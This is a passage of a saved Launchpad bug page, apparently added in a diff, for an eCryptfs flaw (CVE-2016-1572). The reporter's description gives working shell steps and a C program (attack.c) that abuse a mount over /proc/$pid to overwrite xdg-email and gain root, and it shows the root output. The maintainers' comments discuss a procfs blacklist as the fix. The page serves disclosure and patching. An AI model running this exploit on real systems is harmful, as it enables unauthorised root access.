+                  select_menu, text_input);
+          });</script>
+    
+
+    <span class="hidden">(<a id="show-widget-ubuntu_wily_ecryptfs-utils-sourcepackagename" href="#">Find&hellip;</a>)</span>
+    <script>
+  LPJS.use('node', 'lp.app.picker', function(Y) {
+      var config = {"remove_team_text": "Remove team", "header": "Select a package", "show_remove_button": false, "selected_value": "ecryptfs-utils", "step_title": "Search by name", "show_assign_me_button": false, "vocabulary_filters": [], "vocabulary_name": "DistributionSourcePackage", "input_element": "ubuntu_wily_ecryptfs-utils.sourcepackagename", "show_widget_id": "show-widget-ubuntu_wily_ecryptfs-utils-sourcepackagename", "assign_me_text": "Pick me", "show_create_team": false, "remove_person_text": "Remove person", "picker_type": "default", "extra_no_results_message": null, "selected_value_metadata": null};
+      var distribution_name = '';
+      var distribution_id = '';
+      var distroseries_id = '';
+      if (distribution_name !== '') {
+          config.getContextPath = function() {
+              return '/' + distribution_name;
+          }
+      } else if (distribution_id !== '') {
+          config.getContextPath = function() {
+              return '/' + Y.DOM.byId(distribution_id).value;
+          };
+      } else if (distroseries_id !== '') {
+          config.getContextPath = function() {
+              return '/' + Y.DOM.byId(distroseries_id).value.split('/', 2)[0];
+          };
+      }
+      var show_widget_id = 'show-widget-ubuntu_wily_ecryptfs-utils-sourcepackagename';
+      Y.on('domready', function(e) {
+          Y.lp.app.picker.addPicker(config, show_widget_id);
+      });
+  });
+  </script>
+  
+
+
+
+          
+        </td>
+      </tr>
+    </table>
+    <table>
+      <tr>
+        <td>
+          <label style="font-weight: bold" for="ubuntu_wily_ecryptfs-utils.status">Status</label>
+        </td>
+        <td>
+          <label style="font-weight: bold" for="ubuntu_wily_ecryptfs-utils.importance">Importance</label>
+        </td>
+        
+      </tr>
+      <tr>
+        <td><div>
+<div class="value">
+<select id="ubuntu_wily_ecryptfs-utils.status" name="ubuntu_wily_ecryptfs-utils.status" size="1" >
+<option selected="selected" value="Fix Released">Fix Released</option>
+</select>
+</div>
+<input name="ubuntu_wily_ecryptfs-utils.status-empty-marker" type="hidden" value="1" />
+</div></td>
+        <td title="Changeable only by a project maintainer or bug supervisor">
+          <span class="sprite read-only"></span>
+          <span class="importanceHIGH">High</span>
+        </td>
+        
+      </tr>
+    </table>
+    <table>
+      <tr>
+        <td>
+          <label style="font-weight: bold" for="ubuntu_wily_ecryptfs-utils.assignee">Assigned to</label>
+        </td>
+      </tr>
+      <tr>
+        <td colspan="2" style="white-space: nowrap">
+
+  <table>
+    
+    <tr>
+      <td style="padding: 0 2px 2px 0">
+        <input type="radio" id="ubuntu_wily_ecryptfs-utils.assignee.assign_to_me" name="ubuntu_wily_ecryptfs-utils.assignee.option" value="ubuntu_wily_ecryptfs-utils.assignee.assign_to_me" />
+      </td>
+      <td style="padding: 0">
+        <label style="font-weight: normal" for="ubuntu_wily_ecryptfs-utils.assignee.assign_to_me">
+          Me
+        </label>
+      </td>
+    </tr>
+    
+      
+        <tr>
+          <td style="padding: 0 2px 2px 0">
+              <input type="radio" checked="checked" id="ubuntu_wily_ecryptfs-utils.assignee.assigned_to" name="ubuntu_wily_ecryptfs-utils.assignee.option" value="ubuntu_wily_ecryptfs-utils.assignee.assigned_to" />
+          </td>
+          <td style="padding: 0">
+            <label style="font-weight: normal" for="ubuntu_wily_ecryptfs-utils.assignee.assigned_to">
+              Tyler Hicks (tyhicks)
+            </label>
+          </td>
+        </tr>
+      
+    
+    
+  </table>
+
+
+</td>
+      </tr>
+    </table>
+    
+  </div>
+  <div class="field">
+    <div>
+      <label style="font-weight: bold" for="ubuntu_wily_ecryptfs-utils.comment_on_change">Comment on this change (optional)</label>
+      <textarea cols="62" rows="4" id="ubuntu_wily_ecryptfs-utils.comment_on_change" name="ubuntu_wily_ecryptfs-utils.comment_on_change"></textarea>
+    </div>
+    <div>
+      <label style="font-weight: normal">
+        <input type="checkbox" name="subscribe" id="subscribe" value="Subscribe" />
+        Email me about changes to this bug report
+      </label>
+    </div>
+  </div>
+  
+</form>
+</td>
+    </tr>
+  
+
+
+        
+        
+          
+  <tr id="tasksummary1976265">
+    <td>
+      <a class="bugtask-expander" href="https://bugs.launchpad.net/ubuntu/xenial/+source/ecryptfs-utils/+bug/1530566/+editstatus">
+        &#8203;
+      </a>
+    </td>
+    <td style="padding: 0.3em 0em 0.3em 1.5em">
+      <span class="sprite milestone"></span>
+      
+        <a href="https://bugs.launchpad.net/ubuntu/xenial/+source/ecryptfs-utils">Xenial</a>
+      
+        
+    </td>
+    
+
+    
+
+    
+    <td style="width: 20%; vertical-align: middle">
+      <div class="status-content" style="width: 100%; float: left">
+        
+        
+          <a href="https://bugs.launchpad.net/ubuntu/xenial/+source/ecryptfs-utils/+bug/1530566/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
+          <a href="https://bugs.launchpad.net/ubuntu/xenial/+source/ecryptfs-utils/+bug/1530566/+editstatus" style="margin-left: 3px">
+            <img class="editicon" src="/@@/edit" />
+          </a>
+        
+      </div>
+    </td>
+
+    
+    <td style="width: 15em; vertical-align: middle">
+      <div class="importance-content" style="width: 100%; float: left">
+        <span style="float: left" class="value importanceHIGH">High</span>
+      </div>
+    </td>
+
+    <td style="width:20%; margin: 0; padding: 0;
+               vertical-align: middle; padding-left: 0.5em">
+      
+
+      
+        <span id="assignee-picker-tasksummary1976265">
+          <span class="yui3-activator-data-box">
+            <a class="sprite person" href="https://launchpad.net/~kirkland">Dustin Kirkland </a>
+            
+          </span>
+          
+          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
+            Edit
+          </button>
+          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
+        </span>
+      
+    </td>
+
+    <td style="width: 20%; vertical-align: middle">
+      <div class="milestone-content" style="width: 100%; float: left">
+        
+        <a class="value" href=""></a>
+        
+      </div>
+    </td>
+
+    
+  </tr>
+
+  
+    <tr class="bugtask-collapsible-content hidden" id="task1976265">
+     <td colspan="7"><form action="/ubuntu/xenial/+source/ecryptfs-utils/+bug/1530566/+editstatus" method="post" enctype="multipart/form-data">
+  
+
+  <p class="error message">
+    You need to log in to change this bug's status.
+  </p>
+  
+  <table class="summary" style="float: right; margin-left: 1em;">
+    <tr>
+      <th>Affecting:</th>
+      <td><a href="/ubuntu/xenial/+source/ecryptfs-utils">ecryptfs-utils (Ubuntu Xenial)</a></td>
+    </tr>
+    <tr>
+      <th>Filed here by:</th>
+      <td><a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks</a></td>
+    </tr>
+    <tr>
+      <th>When:</th>
+      <td>
+        <time title="2016-01-11 16:48:52 UTC" datetime="2016-01-11T16:48:52.579205+00:00">2016-01-11</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Confirmed:</th>
+      <td>
+        <time title="2016-01-21 01:21:43 UTC" datetime="2016-01-21T01:21:43.482802+00:00">2016-01-21</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Assigned:</th>
+      <td>
+        <time title="2016-01-21 01:21:51 UTC" datetime="2016-01-21T01:21:51.875290+00:00">2016-01-21</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Started work:</th>
+      <td>
+        <time title="2016-01-22 18:30:25 UTC" datetime="2016-01-22T18:30:25.424143+00:00">2016-01-22</time>
+      </td>
+    </tr>
+    <tr>
+      <th>Completed:</th>
+      <td>
+        <time title="2016-01-22 18:30:25 UTC" datetime="2016-01-22T18:30:25.424143+00:00">2016-01-22</time>
+      </td>
+    </tr>
+  </table>
+  <div class="field">
+    
+    <table>
+      <tr>
+        <td>
+          <label for="ubuntu_xenial_ecryptfs-utils.sourcepackagename">Package</label>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          
+
+
+    <input type="text" value="ecryptfs-utils" id="ubuntu_xenial_ecryptfs-utils.sourcepackagename"
+                         name="ubuntu_xenial_ecryptfs-utils.sourcepackagename" size="20"
+                         maxlength=""
+                         onKeyPress="" style=""
+                         class="" />
+
+    
+      
+      <script type="text/javascript">
+          LPJS.use('node', 'lp.app.picker', function(Y) {
+              var text_input = Y.DOM.byId('ubuntu_xenial_ecryptfs-utils.sourcepackagename');
+              var select_menu = Y.DOM.byId('ubuntu_xenial_ecryptfs-utils.sourcepackagename-suggestions');
+              Y.lp.app.picker.connect_select_menu(
+                  select_menu, text_input);
+          });</script>
+    
+
+    <span class="hidden">(<a id="show-widget-ubuntu_xenial_ecryptfs-utils-sourcepackagename" href="#">Find&hellip;</a>)</span>
+    <script>
+  LPJS.use('node', 'lp.app.picker', function(Y) {
+      var config = {"remove_team_text": "Remove team", "header": "Select a package", "show_remove_button": false, "selected_value": "ecryptfs-utils", "step_title": "Search by name", "show_assign_me_button": false, "vocabulary_filters": [], "vocabulary_name": "DistributionSourcePackage", "input_element": "ubuntu_xenial_ecryptfs-utils.sourcepackagename", "show_widget_id": "show-widget-ubuntu_xenial_ecryptfs-utils-sourcepackagename", "assign_me_text": "Pick me", "show_create_team": false, "remove_person_text": "Remove person", "picker_type": "default", "extra_no_results_message": null, "selected_value_metadata": null};
+      var distribution_name = '';
+      var distribution_id = '';
+      var distroseries_id = '';
+      if (distribution_name !== '') {
+          config.getContextPath = function() {
+              return '/' + distribution_name;
+          }
+      } else if (distribution_id !== '') {
+          config.getContextPath = function() {
+              return '/' + Y.DOM.byId(distribution_id).value;
+          };
+      } else if (distroseries_id !== '') {
+          config.getContextPath = function() {
+              return '/' + Y.DOM.byId(distroseries_id).value.split('/', 2)[0];
+          };
+      }
+      var show_widget_id = 'show-widget-ubuntu_xenial_ecryptfs-utils-sourcepackagename';
+      Y.on('domready', function(e) {
+          Y.lp.app.picker.addPicker(config, show_widget_id);
+      });
+  });
+  </script>
+  
+
+
+
+          
+        </td>
+      </tr>
+    </table>
+    <table>
+      <tr>
+        <td>
+          <label style="font-weight: bold" for="ubuntu_xenial_ecryptfs-utils.status">Status</label>
+        </td>
+        <td>
+          <label style="font-weight: bold" for="ubuntu_xenial_ecryptfs-utils.importance">Importance</label>
+        </td>
+        
+      </tr>
+      <tr>
+        <td><div>
+<div class="value">
+<select id="ubuntu_xenial_ecryptfs-utils.status" name="ubuntu_xenial_ecryptfs-utils.status" size="1" >
+<option selected="selected" value="Fix Released">Fix Released</option>
+</select>
+</div>
+<input name="ubuntu_xenial_ecryptfs-utils.status-empty-marker" type="hidden" value="1" />
+</div></td>
+        <td title="Changeable only by a project maintainer or bug supervisor">
+          <span class="sprite read-only"></span>
+          <span class="importanceHIGH">High</span>
+        </td>
+        
+      </tr>
+    </table>
+    <table>
+      <tr>
+        <td>
+          <label style="font-weight: bold" for="ubuntu_xenial_ecryptfs-utils.assignee">Assigned to</label>
+        </td>
+      </tr>
+      <tr>
+        <td colspan="2" style="white-space: nowrap">
+
+  <table>
+    
+    <tr>
+      <td style="padding: 0 2px 2px 0">
+        <input type="radio" id="ubuntu_xenial_ecryptfs-utils.assignee.assign_to_me" name="ubuntu_xenial_ecryptfs-utils.assignee.option" value="ubuntu_xenial_ecryptfs-utils.assignee.assign_to_me" />
+      </td>
+      <td style="padding: 0">
+        <label style="font-weight: normal" for="ubuntu_xenial_ecryptfs-utils.assignee.assign_to_me">
+          Me
+        </label>
+      </td>
+    </tr>
+    
+      
+        <tr>
+          <td style="padding: 0 2px 2px 0">
+              <input type="radio" checked="checked" id="ubuntu_xenial_ecryptfs-utils.assignee.assigned_to" name="ubuntu_xenial_ecryptfs-utils.assignee.option" value="ubuntu_xenial_ecryptfs-utils.assignee.assigned_to" />
+          </td>
+          <td style="padding: 0">
+            <label style="font-weight: normal" for="ubuntu_xenial_ecryptfs-utils.assignee.assigned_to">
+              Dustin Kirkland  (kirkland)
+            </label>
+          </td>
+        </tr>
+      
+    
+    
+  </table>
+
+
+</td>
+      </tr>
+    </table>
+    
+  </div>
+  <div class="field">
+    <div>
+      <label style="font-weight: bold" for="ubuntu_xenial_ecryptfs-utils.comment_on_change">Comment on this change (optional)</label>
+      <textarea cols="62" rows="4" id="ubuntu_xenial_ecryptfs-utils.comment_on_change" name="ubuntu_xenial_ecryptfs-utils.comment_on_change"></textarea>
+    </div>
+    <div>
+      <label style="font-weight: normal">
+        <input type="checkbox" name="subscribe" id="subscribe" value="Subscribe" />
+        Email me about changes to this bug report
+      </label>
+    </div>
+  </div>
+  
+</form>
+</td>
+    </tr>
+  
+
+
+        
+      </tbody>
+
+    </table>
+
+
+
+<div class="actions">
+  
+    <span id="also-affects-product" class="">
+    <a class="menu-link-addupstream sprite add" href="https://bugs.launchpad.net/ecryptfs/+bug/1530566/+choose-affected-product">Also affects project</a>
+        <a href="/+help-bugs/also-affects-project-help.html" target="help" class="sprite maybe action-icon">(?)</a>
+    </span>
+    <span id="also-affects-package" class="">
+    <a class="menu-link-adddistro sprite add" href="https://bugs.launchpad.net/ecryptfs/+bug/1530566/+distrotask">Also affects distribution/package</a>
+    </span>
+    <a class="menu-link-nominate sprite milestone" href="https://bugs.launchpad.net/ecryptfs/+bug/1530566/+nominate">Nominate for series</a>
+    
+  
+
+</div>
+
+
+
+
+      <div id="maincontentsub">
+        <div class="top-portlet">
+
+      <div itemprop="mainContentOfPage" class="report">
+        
+
+        <div>
+  <div class="lazr-multiline-edit" id="edit-description">
+  <div class="clearfix">
+    
+
+    <h3>Bug Description</h3>
+  </div>
+
+  <div class="yui3-editable_text-text"><p>An unprivileged user can mount an ecryptfs over /proc/$pid because according to stat(), it is a normal directory and owned by the user. However, the user is not actually permitted to create arbitrary directory entries in /proc/$pid, and ecryptfs&#x27; behavior might be enabling privilege escalation attacks with the help of other programs that use procfs.</p>
+<p>Repro:</p>
+<p>On Ubuntu 15.10 Desktop, as root, install ecryptfs-utils and uidmap. Then, as user, do this:</p>
+<p>=======<wbr />=======<wbr />=======<wbr />=======<wbr />=======<wbr />=======<wbr />=======<wbr />=======<wbr />=======<wbr />=======<wbr />=======<wbr />=<br />
+user2@user-<wbr />VirtualBox:<wbr />~$ ecryptfs-<wbr />setup-private<br />
+Enter your login passphrase [user2]:<br />
+Enter your mount passphrase [leave blank to generate one]:<br />
+Enter your mount passphrase (again):</p>
+<p>*******<wbr />*******<wbr />*******<wbr />*******<wbr />*******<wbr />*******<wbr />*******<wbr />*******<wbr />*******<wbr />*******<wbr />**<br />
+YOU SHOULD RECORD YOUR MOUNT PASSPHRASE AND STORE IT IN A SAFE LOCATION.<br />
+&nbsp;&nbsp;ecryptfs-<wbr />unwrap-<wbr />passphrase ~/.ecryptfs/<wbr />wrapped-<wbr />passphrase<br />
+THIS WILL BE REQUIRED IF YOU NEED TO RECOVER YOUR DATA AT A LATER TIME.<br />
+*******<wbr />*******<wbr />*******<wbr />*******<wbr />*******<wbr />*******<wbr />*******<wbr />*******<wbr />*******<wbr />*******<wbr />**</p>
+<p>Done configuring.</p>
+<p>Testing mount/write/<wbr />umount/<wbr />read...<br />
+Inserted auth tok with sig [85448916757c54dd] into the user session keyring<br />
+Inserted auth tok with sig [6105ef336170239a] into the user session keyring<br />
+Inserted auth tok with sig [85448916757c54dd] into the user session keyring<br />
+Inserted auth tok with sig [6105ef336170239a] into the user session keyring<br />
+Testing succeeded.</p>
+<p>Logout, and log back in to begin using your encrypted directory.</p>
+<p>user2@user-<wbr />VirtualBox:<wbr />~$ echo &quot;/home/<wbr />user2/.<wbr />Private /proc/$$ ecryptfs none 0 0&quot; &gt; .ecryptfs/evil.conf<br />
+user2@user-<wbr />VirtualBox:<wbr />~$ cp .ecryptfs/<wbr />Private.<wbr />sig .ecryptfs/evil.sig<br />
+user2@user-<wbr />VirtualBox:<wbr />~$ sed &#x27;s|/sbin/<wbr />mount\.<wbr />ecryptfs_<wbr />private|<wbr />\0 evil|&#x27; &lt; /usr/bin/<wbr />ecryptfs-<wbr />mount-private &gt; /tmp/foo<br />
+user2@user-<wbr />VirtualBox:<wbr />~$ chmod +x /tmp/foo<br />
+user2@user-<wbr />VirtualBox:<wbr />~$ /tmp/foo<br />
+Enter your login passphrase:<br />
+Inserted auth tok with sig [85448916757c54dd] into the user session keyring<br />
+user2@user-<wbr />VirtualBox:<wbr />~$ ln -s /etc/hostname /proc/$$/uid_map<br />
+user2@user-<wbr />VirtualBox:<wbr />~$ newuidmap $$ 0 1001 1<br />
+user2@user-<wbr />VirtualBox:<wbr />~$ cat /etc/hostname<br />
+0 1001 1<br />
+ualBox<br />
+=======<wbr />=======<wbr />=======<wbr />=======<wbr />=======<wbr />=======<wbr />=======<wbr />=======<wbr />=======<wbr />=======<wbr />=======<wbr />=</p>
+<p>As you can see, the start of /etc/hostname was clobbered with attacker-controlled content.</p>
+<p>Now the interesting part comes: We can only write lines with numbers, and only starting at the start of files, so how does this yield code exec? :D<br />
+Bash has an interesting behavior when invoking executable files: If the kernel doesn&#x27;t recognize a file, bash will try to run it as a shellscript. And then, if that shellscript contains a spew of invalid commands, bash will just keep going (and spit out error messages) until it hits a valid command. When it sees a single line with a valid command, it&#x27;ll run it, no matter what comes after that. And therefore, this works (after the same preparation as above):</p>
+<p>$ grep -bo &#x27;/tmp/.*&#x27; /usr/bin/xdg-email<br />
+4721:/tmp/logo.png \</p>
+<p>We need 4721 bytes padding.<br />
+&quot;0 1001 1\n&quot; is 9 bytes long, we use it until the remaining padding is a multiple of 10. Every use increments the last digit by one, so we use it 9 times. The remaining padding is 4721-9*9=4640 bytes, which we can fill using 464 times &quot;10 1001 1\n&quot;, which is 10 bytes long.</p>
+<p>$ rm /proc/$$/uid_map # if it still exists from the last part<br />
+$ ln -s /usr/bin/xdg-email /proc/2468/uid_map<br />
+$ cat attack.c<br />
+#include &lt;err.h&gt;<br />
+#include &lt;unistd.h&gt;<br />
+#include &lt;string.h&gt;</p>
+<p>int main(int argc, char **argv_in) {<br />
+&nbsp;&nbsp;if (argc != 3)<br />
+&nbsp;&nbsp;&nbsp;&nbsp;errx(1, &quot;bad invocation, want ./attack &lt;pid&gt; &lt;myuid&gt;&quot;);<br />
+&nbsp;&nbsp;char *pid = argv_in[1];<br />
+&nbsp;&nbsp;char *myuid = argv_in[2];<br />
+&nbsp;&nbsp;if (strlen(myuid) != 4)<br />
+&nbsp;&nbsp;&nbsp;&nbsp;errx(1, &quot;bad uid&quot;);<br />
+&nbsp;&nbsp;int pad10_count = 464;<br />
+&nbsp;&nbsp;int pad9_count = 9;<br />
+&nbsp;&nbsp;int total_count = pad10_count + pad9_count;<br />
+&nbsp;&nbsp;char *argv[1 + 1 + 3 * total_count + 1];<br />
+&nbsp;&nbsp;argv[0] = &quot;newuidmap&quot;;<br />
+&nbsp;&nbsp;argv[1] = pid;<br />
+&nbsp;&nbsp;int j = 2;<br />
+&nbsp;&nbsp;for (int i=0; i&lt;pad10_count; i++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;argv[j++] = &quot;10&quot;;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;argv[j++] = &quot;1001&quot;;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;argv[j++] = &quot;1&quot;;<br />
+&nbsp;&nbsp;}<br />
+&nbsp;&nbsp;for (int i=0; i&lt;pad9_count; i++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;argv[j++] = &quot;1&quot;;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;argv[j++] = &quot;1001&quot;;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;argv[j++] = &quot;1&quot;;<br />
+&nbsp;&nbsp;}<br />
+&nbsp;&nbsp;argv[j++] = NULL;<br />
+&nbsp;&nbsp;execvp(<wbr />&quot;newuidmap&quot;<wbr />, argv);<br />
+&nbsp;&nbsp;err(1, &quot;execvp&quot;);<br />
+}<br />
+$ gcc -o attack attack.c -Wall -std=gnu99<br />
+$ ./attack $$ 1001<br />
+$ echo -e &#x27;#!/bin/sh\necho &quot;owned!&quot;\nid\nkill -9 $PPID&#x27; &gt; /tmp/logo.png<br />
+$ chmod +x /tmp/logo.png</p>
+<p>And now as another user (or root):</p>
+<p>lBox:/etc# xdg-email<br />
+/usr/bin/xdg-email: line 1: 10: command not found<br />
+/usr/bin/xdg-email: line 2: 10: command not found<br />
+[...]<br />
+/usr/bin/xdg-email: line 472: 1: command not found<br />
+/usr/bin/xdg-email: line 473: 1: command not found<br />
+owned!<br />
+uid=0(root) gid=0(root) groups=0(root)<br />
+Killed</p>
+<p>Of course, this kind of modification doesn&#x27;t work for most executables, but it does work for some.</p>
+<p>Another way to exploit this without newuidmap might be to confuse polkit about the identity of a connecting process - _polkit_<wbr />unix_process_<wbr />get_owner(<wbr />) contains code to determine the ruid of a process by reading its /proc/$pid/status file. I didn&#x27;t investigate that much though, so I&#x27;m not sure whether that codepath is actually used anywhere.</p>
+<p>I&#x27;m not sure about what a proper fix for this would look like - maybe just blacklist the dev_t of procfs when checking the result of stat()ing the mountpoint and also require access(&quot;.&quot;, R_OK|W_OK|X_OK) to be successful? Or you could do what FUSE does and prevent anyone except for the user from accessing the mountpoint.</p></div>
+  </div>
+
+  
+</div>
+
+
+        <div style="margin:-10px 0 20px 5px" class="clearfix">
+          <span>See <a href="comments/0">original description</a></span>
+        </div>
+
+        <div id="bug-tags">
+          <span id="tags-heading">
+            Tags:
+          </span>
+          <span id="tag-list">
+            <a class="official-tag" href="/ecryptfs/+bugs?field.tag=patch">patch</a>
+          </span>
+          
+          <a href="+edit" title="Edit tags" id="tags-trigger" class="sprite edit action-icon">Edit</a>
+          <a href="/+help-bugs/tag-help.html" target="help" class="sprite maybe action-icon">Tag help</a>
+        </div>
+
+        <script type="text/javascript">
+          LPJS.use('event', 'node', 'lp.bugs.tags_entry', function(Y) {
+              Y.on('domready',
+                   function(e) {
+                       Y.lp.bugs.tags_entry.setup_tag_entry(
+                           available_official_tags);
+                   },
+                   window);
+          });
+        </script>
+
+        <div class="clearfix"></div>
+      </div>
+
+      <div id="branches-and-cves">
+        <div id="bug-branches-container" style="float: left">
+          
+
+            <div id="bug-branches">
+              <h2>Related branches</h2>
+
+              
+                
+
+ 
+
+ <div class="buglink-summary">
+
+  <a href="https://code.launchpad.net/~ecryptfs/ecryptfs/trunk" class="sprite branch">lp:ecryptfs</a>
+  
+  
+</div>
+
+
+
+              
+            </div>
+          
+        </div><!-- bug-branch-container -->
+
+        <div class="cves">
+          <h2>CVE References</h2>
+          <ul>
+            <li class="sprite cve">
+              <a href="/bugs/cve/2016-1572" title="mount.ecryptfs_private.c in eCryptfs-...">2016-1572</a>
+            </li>
+          </ul>
+        </div>
+
+        <div class="clearfix"></div>
+      </div> <!-- branches and CVEs -->
+
+      </div>
+
+      <div>
+      
+        
+          
+
+          
+              <div class="boardComment">
+  <div class="boardCommentDetails">
+    
+      <a href="https://launchpad.net/~jann-e" class="sprite person">Jann Horn (jann-e)</a>
+    
+    <time title="2016-01-02 19:17:21 UTC" datetime="2016-01-02T19:17:21.859373+00:00">on 2016-01-02</time>
+  </div>
+  <div class="boardCommentActivity">
+    <table class="bug-activity">
+  
+    
+      
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>information type</b>:
+      </td>
+      <td>
+        Private Security &#8594; Private
+      </td>
+    </tr>
+    <tr>
+      <td style="text-align: right;">
+        <b>information type</b>:
+      </td>
+      <td>
+        Private &#8594; Private Security
+      </td>
+    </tr>
+  
+</table>
+  </div>
+</div>
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ecryptfs/+bug/1530566/comments/1" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2016-01-05T00:21:47.800060+00:00" title="2016-01-05 00:21:47 UTC">on 2016-01-05</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ecryptfs/+bug/1530566/comments/1"> #1</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>Thanks for the report, Jann.</p>
+<p>My initial thoughts are that we should blacklist mounting on top of procfs, as you suggested. I&#x27;ll give it some more thought tomorrow.</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">Thanks for the report, Jann.
+
+My initial thoughts are that we should blacklist mounting on top of procfs, as you suggested. I'll give it some more thought tomorrow.</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  <div class="boardCommentActivity">
+    
+      <table class="bug-activity">
+  
+    
+      <tr>
+        <td colspan="2">Changed in ecryptfs: </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>importance</b>:
+      </td>
+      <td>
+        Undecided &#8594; High
+      </td>
+    </tr>
+  
+</table>
+    
+    
+  </div>
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+
+          
+              <div class="boardComment">
+  <div class="boardCommentDetails">
+    
+      <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
+    
+    <time title="2016-01-06 00:31:54 UTC" datetime="2016-01-06T00:31:54.292952+00:00">on 2016-01-06</time>
+  </div>
+  <div class="boardCommentActivity">
+    <table class="bug-activity">
+  
+    
+      
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>description</b>:
+      </td>
+      <td>
+        updated
+      </td>
+    </tr>
+  
+</table>
+  </div>
+</div>
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ecryptfs/+bug/1530566/comments/2" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2016-01-07T17:50:48.851043+00:00" title="2016-01-07 17:50:48 UTC">on 2016-01-07</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ecryptfs/+bug/1530566/comments/2"> #2</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>Here&#x27;s a patch that implements a blacklist of filesystem types that must not be found at the mount destination path. I&#x27;d prefer to implement a whitelist here but I think it would greatly increase the risk of breaking a valid use case.</p>
+<p>I&#x27;d appreciate review from other eCryptfs maintainers. Thanks!</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">Here's a patch that implements a blacklist of filesystem types that must not be found at the mount destination path. I'd prefer to implement a whitelist here but I think it would greatly increase the risk of breaking a valid use case.
+
+I'd appreciate review from other eCryptfs maintainers. Thanks!</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ecryptfs/+bug/1530566/comments/3" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
+            wrote
